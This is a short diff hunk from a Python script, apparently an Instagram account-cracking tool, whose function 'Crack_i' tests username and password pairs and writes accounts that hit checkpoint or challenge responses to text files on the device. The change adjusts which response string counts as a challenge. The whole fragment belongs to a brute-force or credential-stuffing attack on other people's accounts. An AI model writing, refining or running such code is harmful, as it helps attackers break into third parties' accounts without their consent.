@@ -941,7 +941,7 @@ def Crack_i(username, memek):
                 print(f"\r\033[1;93m [⚠ CHECKPOINT] {username} | {password}")
                 open("/sdcard/SUMON_INS_CP.txt","a").write(username+"|"+password+"\n")
                 break
-            elif 'challenge_required' in str(response.text.replace('\\', '')):
+            elif 'checkpoint_challenge_required' in str(response.text.replace('\\', '')):
                 Cp += 1
                 print(f"\r\033[1;93m [⚠ challenge] {username} | {password}")
                 open("/sdcard/SUMON_INS_Cl.txt","a").write(username+"|"+password+"\n")
